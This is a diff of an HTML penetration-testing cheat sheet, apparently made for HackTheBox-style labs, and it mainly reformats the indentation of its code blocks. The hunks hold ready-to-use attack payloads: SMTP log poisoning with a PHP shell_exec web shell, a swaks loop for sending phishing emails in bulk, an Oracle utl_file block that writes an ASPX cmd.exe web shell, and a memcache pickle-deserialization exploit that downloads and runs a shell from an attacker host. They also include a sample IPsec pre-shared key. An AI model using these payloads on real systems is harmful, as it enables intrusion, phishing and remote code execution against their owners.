@@ -230,26 +230,26 @@
             <li>On internal networks you can typically send emails as anybody</li>
             <li>SMTP poisoning
                 <pre>
-                    telnet 10.0.0.12 25
-                    Trying 10.0.0.12...
-                    Connected to 10.0.0.12.
-                    Escape character is '^]'.
-                    220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
-                    HELO example.com
-                    250 symfonos.localdomain
-                    mail from: hacker@example.com
-                    250 2.1.0 Ok
-                    rcpt to: helios@symfonos.localdomain
-                    250 2.1.5 Ok
-                    data
-                    354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
-                    subject: 
-                    &lt;?php echo shell_exec($_GET['cmd]); ?&gt;
-                    .
-                    250 2.0.0 Ok: queued as 8A6884082B
-                    quit
-                    221 2.0.0 Bye
-                    Connection closed by foreign host.
+telnet 10.0.0.12 25
+Trying 10.0.0.12...
+Connected to 10.0.0.12.
+Escape character is '^]'.
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+HELO example.com
+250 symfonos.localdomain
+mail from: hacker@example.com
+250 2.1.0 Ok
+rcpt to: helios@symfonos.localdomain
+250 2.1.5 Ok
+data
+354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
+subject: 
+&lt;?php echo shell_exec($_GET['cmd]); ?&gt;
+.
+250 2.0.0 Ok: queued as 8A6884082B
+quit
+221 2.0.0 Bye
+Connection closed by foreign host.
                 </pre>
             </li>
             <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
@@ -283,15 +283,17 @@
                         <tr>
                             <tr>Bash script to send emails to a list</tr>
                             <tr>
-                                <pre>for email in $(cat email.lst);
-                                    do
-                                    swaks \
-                                    --from support@sneakymailer.htb \
-                                    --to $email \
-                                    --header 'Subject: Please Register Your Account' \
-                                    --body 'http://10.10.14.106/test' \
-                                    --server sneakymailer.htb
-                                done;</pre>
+                                <pre>
+for email in $(cat email.lst);
+do
+    swaks \
+        --from support@sneakymailer.htb \
+        --to $email \
+        --header 'Subject: Please Register Your Account' \
+        --body 'http://&lt;ip address&gt;/test' \
+        --server sneakymailer.htb
+done;
+                            </pre>
                             </tr>
                         </tr>
                     </table>
@@ -1429,68 +1431,75 @@
                 <table>
                     <tr>
                         <td>Fields Explained</td>
-                        <td><pre># This file holds shared secrets or RSA private keys for authentication.
-                        %any : &lt;Authentication Type - Example: PSK&gt; "&lt;VPN Password&gt;"</pre></td>
+                        <td><pre>
+# This file holds shared secrets or RSA private keys for authentication.
+%any : &lt;Authentication Type - Example: PSK&gt; &quot;&lt;VPN Password&gt;&quot;
+                        </pre></td>
                     </tr>
                     <tr>
                         <td>Example file</td>
-                        <td><pre># This file holds shared secrets or RSA private keys for authentication.
-                        %any : PSK "Dudecake1!"</pre></td>
+                        <td><pre>
+# This file holds shared secrets or RSA private keys for authentication.
+
+%any : PSK "Dudecake1!"
+                    </pre></td>
                     </tr>
                 </table>
                 <li>/etc/ipsec.conf</li>
                 <table>
                     <tr>
                         <td>Fields Explained</td>
-                        <td><pre># ipsec.conf - strongSwan IPsec configuration file
+                        <td><pre>
+# ipsec.conf - strongSwan IPsec configuration file
+config setup
+    charondebug="all"
+# More verbose for troubleshooting connection
 
-                            config setup
-                            charondebug="all"
-                            # More verbose for troubleshooting connection
+    uniqueids=yes
+    strictcrlpolicy=no
+conn conceal
+    authby=secret
+# Auth type.  PSK = secret
 
-                            uniqueids=yes
-                            strictcrlpolicy=no
-                            conn conceal
-                            authby=secret
-                            # Auth type.  PSK = secret
+    auto=add
+    ike=&lt;Value 1&gt;-&lt;Value 2&gt;-&lt;Value 3&gt;!
+# ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;; Group=2:&lt;value 3&gt;
 
-                            auto=add
-                            ike=&lt;Value 1&gt;-&lt;Value 2&gt;-&lt;Value 3&gt;!
-                            # ike-scan values: Enc=&lt;Value 1&gt; Hash=&lt;Value 2&gt;; Group=2:&lt;value 3&gt;
+    esp=&lt;Value 1&gt;-&lt;Value 2&gt;!
+# ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;
 
-                            esp=&lt;Value 1&gt;-&lt;Value 2&gt;!
-                            # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;
+    type=transport
+# ipsec transport mode
 
-                            type=transport
-                            # ipsec transport mode
+    keyexchange=ikev1
+# ike-scan value: (IKE CGA version 1) = ikev1
 
-                            keyexchange=ikev1
-                            # ike-scan value: (IKE CGA version 1) = ikev1
-
-                            left=&lt;Local Machine IP&gt;
-                            right=&lt;Remote Machine IP&gt;
-                            rightsubnet=&lt;Remote Machine IP&gt;[tcp]
+    left=&lt;Local Machine IP&gt;
+    right=&lt;Remote Machine IP&gt;
+    rightsubnet=&lt;Remote Machine IP&gt;[tcp]
                         </pre></td>
                     </tr>
                     <tr>
                         <td>Example File</td>
-                        <td><pre># ipsec.conf - strongSwan IPsec configuration file
+                        <td><pre>
+# ipsec.conf - strongSwan IPsec configuration file
 
-                            config setup
-                            charondebug="all"
-                            uniqueids=yes
-                            strictcrlpolicy=no
+config setup
+    charondebug="all"
+    uniqueids=yes
+    strictcrlpolicy=no
 
-                            conn conceal
-                            authby=secret
-                            auto=add
-                            ike=3des-sha1-modp1024!
-                            esp=3des-sha1!
-                            type=transport
-                            keyexchange=ikev1
-                            left=10.10.14.6
-                            right=10.10.10.116
-                        rightsubnet=10.10.10.116[tcp]</pre></td>
+conn conceal
+    authby=secret
+    auto=add
+    ike=3des-sha1-modp1024!
+    esp=3des-sha1!
+    type=transport
+    keyexchange=ikev1
+    left=10.10.14.6
+    right=10.10.10.116
+    rightsubnet=10.10.10.116[tcp]
+                    </pre></td>
                     </tr>
                 </table>
             </ul>
@@ -1588,10 +1597,12 @@
     <li>sqsh</li>
     <ul>
         <li>append server to /etc/freetds/freetds.config</li>
-        <pre>[&lt;hostname&gt;]
-            host = &lt;ip&gt;
-            port = &lt;port #&gt;
-        tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;</pre>
+        <pre>
+[&lt;hostname&gt;]
+    host = &lt;ip address&gt;
+    port = &lt;port #&gt;
+tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;
+        </pre>
         <li>Commands</li>
         <table>
             <tr>
@@ -1748,14 +1759,15 @@
             <li>sed -z 's/\n//g' &lt;file&gt;</li>
         </ul>
         <li>aspx web shell example:</li>
-        <pre>declare
-            f utl_file.file_type;
-            s varchar(5000) := '&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language="c#" runat="server"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id="cmd" method="post" runat="server"&lt;&gt;asp:TextBox id="txtArg" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label id="lblText" runat="server"&t;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';
-            begin
-            f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');
-            utl_file.put_line(f,s);
-            utl_file.fclose(f);
-            end;
+        <pre>
+declare
+f utl_file.file_type;
+s varchar(5000) := &#039;&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments = &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;&#039;;
+begin
+f := utl_file.fopen(&#039;/inetpub/wwwroot&#039;, &#039;shell.aspx&#039;, &#039;W&#039;);
+utl_file.put_line(f,s);
+utl_file.fclose(f);
+end;
         </pre>
     </ul>
 
@@ -2193,17 +2205,17 @@
         <ul>
             <li>Script:</li>
             <pre>
-                import pickle
-                import os
-                import sys
-                from pymemcache.client import base
-                class RCE:
-                def __reduce__(self):
-                cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
-                return os.system, (cmd,)
-                if __name__ == '__main__':
-                client = base.Client((sys.argv[2], 11211))
-                client.set(sys.argv[3], pickle.dumps(RCE()))
+import pickle
+import os
+import sys
+from pymemcache.client import base
+class RCE:
+    def __reduce__(self):
+        cmd = (&#039;wget http://{}:5000/shell -O /tmp/shell &amp;&amp; chmod 777 /tmp/shell &amp;&amp; /tmp/shell&#039;.format(sys.argv[1]))
+        return os.system, (cmd,)
+if __name__ == &#039;__main__&#039;:
+    client = base.Client((sys.argv[2], 11211))
+    client.set(sys.argv[3], pickle.dumps(RCE()))
             </pre>
         </ul>
         <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
@@ -2214,7 +2226,7 @@
             </ul>
         </ul>
     </ul>
-
+    
 </body>
 </html>
 
